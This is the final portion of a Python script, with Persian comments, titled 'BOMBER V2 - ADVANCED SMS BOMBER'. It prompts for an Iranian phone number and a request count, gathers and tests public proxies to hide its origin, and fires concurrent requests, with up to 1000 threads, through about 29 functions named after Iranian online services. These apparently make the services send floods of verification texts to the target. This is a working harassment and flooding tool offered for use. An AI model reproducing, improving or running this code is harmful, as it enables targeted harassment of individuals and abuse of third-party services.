        return f"+98{phone}"
    else:
        return False

def print_low(text):
    for char in text:
        print(char, end='', flush=True)
        sleep(0.001)

# لیست توابع برای ارسال درخواست‌ها
functions = [smarket, snap, torob, tap30, okorosh, divar, gap, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf, classino, alibaba, tetherland, jabama, mobit]

def test_proxies():
    """تست پروکسی‌ها برای اطمینان از کارایی"""
    global proxy_list
    safe_print(f"{y}[!] Testing proxies for validity...")
    working_proxies = []
    
    test_url = "http://httpbin.org/ip"
    for proxy in proxy_list[:50]:  # تست 50 تا اول
        if proxy is None:
            continue
        try:
            response = get(test_url, proxies=proxy, timeout=5, verify=False)
            if response.status_code == 200:
                working_proxies.append(proxy)
        except:
            continue
    
    if working_proxies:
        safe_print(f"{g}[+] {len(working_proxies)} working proxies found")
        proxy_list = working_proxies
    else:
        safe_print(f"{y}[!] No working proxies found, will use direct connection")
        proxy_list = [None]

# نمایش لوگو
print_low(f"""
{c}╔══════════════════════════════════════════════════════════╗
{c}║{y}            BOMBER V2 - ADVANCED SMS BOMBER                {c}║
{c}║{w}           با قابلیت استخراج خودکار پروکسی                  {c}║
{c}╚══════════════════════════════════════════════════════════╝

{y}⣀⣀⣀⣀⡀⢀⢀⢀⢀⣀⡀⢀⢀⢀⣀⣀⣀⣀⢀⢀⢀⣀⣀⣀⢀⢀⢀⢀⣀⣀
{g}⣿⡏⠉⠙⣿⡆⢀⢀⣼⣿⣧⢀⢀⢸⣿⠉⠉⢻⣧⢀⣾⡏⠉⠹⠿⢀⢀⢠⣿⣿⡄
{w}⣿⣧⣤⣴⡿⠃⢀⣰⡿⢀⢿⣆⢀⢸⣿⣤⣴⡾⠋⢀⠙⠻⢷⣶⣄⢀⢀⣾⠇⠸⣿⡀
{r}⣿⡇⢀⢀⢀⢀⢠⣿⠛⠛⠛⣿⡄⢸⣿⢀⠘⣿⡄⢀⣶⣆⣀⣨⣿⠂⣼⡟⠛⠛⢻⣧
{y}⠉⠁⢀⢀⢀⢀⠈⠉⢀⢀⢀⠉⠁⠈⠉⢀⢀⠈⠉⢀⢀⠉⠉⠉⠁⢀⠉⠁⢀⢀⠈⠉⠁

{w}             𝐆𝐄𝐍𝐄𝐑A𝐓𝐄𝐃 𝐁𝐘 : @𝐏𝐀𝐑𝐒𝐀_𝐆𝐓𝐈𝟔
{c}══════════════════════════════════════════════════════════════
""")

# دریافت لینک سایت پروکسی
print(f"{y}[!] Enter proxy source URLs (one per line, empty line to finish):")
print(f"{w}Example: https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
print(f"{w}Press Enter directly to use default sources\n")

proxy_urls = []
while True:
    url = input(f"{g}[?] {w}Proxy URL (or press Enter to finish): ").strip()
    if not url:
        break
    proxy_urls.append(url)

# به‌روزرسانی لیست پروکسی
update_proxy_list(proxy_urls if proxy_urls else None)

if len(proxy_list) > 10:
    test_proxies()

print(f"{g}[+] Total proxies available: {len(proxy_list)}")
print(f"{c}══════════════════════════════════════════════════════════════\n")

# دریافت ورودی شماره تلفن
while True:
    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
    print(f"{r}Invalid Phone Number!")

# دریافت تعداد درخواست‌ها
while True:
    try:
        tedad = int(input(f'{r}[?] {g}Enter Number of Requests : '))
        if tedad > 0:
            break
        print(f"{r}Number of requests must be greater than 0!")
    except ValueError:
        print(f"{r}Invalid Input! Please enter a number.")

print(f"{c}══════════════════════════════════════════════════════════════\n")

# تابع اصلی برای ارسال درخواست‌ها
def send_requests(phone, count):
    success_count = 0
    total_requests = count * len(functions)
    
    print(f"{g}[+] Starting {total_requests} requests with {len(functions)} services...")
    print(f"{g}[+] Using {len(proxy_list)} proxies for rotation")
    print(f"{y}[!] All requests will be sent simultaneously with maximum concurrency\n")
    
    # افزایش تعداد کارگرها به 1000 برای حداکثر هم‌روندی
    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = []
        
        # ارسال همه درخواست‌ها به طور همزمان
        for i in range(count):
            for func in functions:
                futures.append(executor.submit(func, phone))
        
        # نمایش پیشرفت بدون توقف
        completed = 0
        last_percent = 0
        for future in as_completed(futures):
            completed += 1
            if future.result():
                success_count += 1
            
            # نمایش پیشرفت هر 1 درصد
            percent = int((completed / total_requests) * 100)
            if percent > last_percent:
                last_percent = percent
                if percent % 10 == 0:  # هر 10 درصد
                    print(f"{g}[{percent}%] {w}Progress: {completed}/{total_requests} - "
                          f"Success: {success_count}, Failed: {completed - success_count}")
        
        print(f"{g}[100%] {w}Progress: {completed}/{total_requests} - "
              f"Success: {success_count}, Failed: {completed - success_count}")
    
    # نمایش نتیجه نهایی
    print(f"\n{c}══════════════════════════════════════════════════════════════")
    print(f"{g}[+] Operation completed successfully!")
    print(f"{w}[*] Total requests sent: {total_requests}")
    print(f"{g}[*] Successful requests: {success_count}")
    print(f"{r}[*] Failed requests: {total_requests - success_count}")
    print(f"{c}══════════════════════════════════════════════════════════════")

# اجرای برنامه
try:
    send_requests(phone, tedad)
except KeyboardInterrupt:
    print(f'\n{r}[-] User Exited')
except Exception as e:
    print(f'\n{r}[-] Error: {e}')